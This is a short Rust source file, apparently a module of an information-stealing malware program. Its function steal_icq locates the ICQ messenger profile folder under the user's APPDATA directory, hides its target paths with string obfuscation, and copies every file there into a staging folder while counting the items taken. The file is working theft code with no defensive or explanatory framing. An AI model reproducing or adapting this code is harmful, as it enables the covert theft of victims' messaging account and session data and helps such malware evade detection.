use walkdir::*;

pub fn steal_icq(path_in: String) {

    let path_str = format!("{}\\{}", std::env::var("APPDATA").unwrap(), obfstr::obfstr!("ICQ\\0001\\"));
    let path = std::path::Path::new(&path_str);

    if !path.exists() {
        return;
    }

    let _ = std::fs::create_dir(format!("{path_in}\\{}", obfstr::obfstr!("ICQ\\")));

    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
       let _ =  std::fs::copy(entry.path(), &format!("{path_in}\\ICQ\\{}", entry.file_name().to_str().unwrap()));

       unsafe {
        crate::OTHERS += 1;
    }
    }




}